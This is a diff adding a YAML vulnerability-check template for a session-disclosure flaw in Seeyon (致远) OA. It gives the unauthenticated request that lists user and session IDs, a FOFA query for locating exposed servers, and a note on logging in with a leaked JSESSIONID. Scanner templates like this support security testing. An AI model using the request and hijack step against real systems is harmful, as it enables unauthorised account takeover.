@@ -1,0 +1,25 @@
+id: seeyon-getsessionlist-session-disclosure
+
+info:
+  name: 致远OA getSessionList.jsp Session泄漏
+  author: sakura404x
+  severity: high
+  verified: true
+  description: |-
+    确定漏洞,使用session登录主页即可 (http://x.x.x.x/yyoa/portal/portalIndex.jsp), Cookie(JSESSIONID=XXXXXXXXXXXXXXXXXXXXXXXXXX)
+    fofa: app="致远互联-OA"
+  reference:
+    - https://mp.weixin.qq.com/s/V1bp8NedoNULf4G4cq8X1g
+  tags: seeyon,disclosure
+  created: 2023/10/29
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /yyoa/ext/https/getSessionList.jsp?cmd=getAll
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b"<usrID>") && 
+      response.body.bcontains(b"<sessionID>")
+expression: r0()
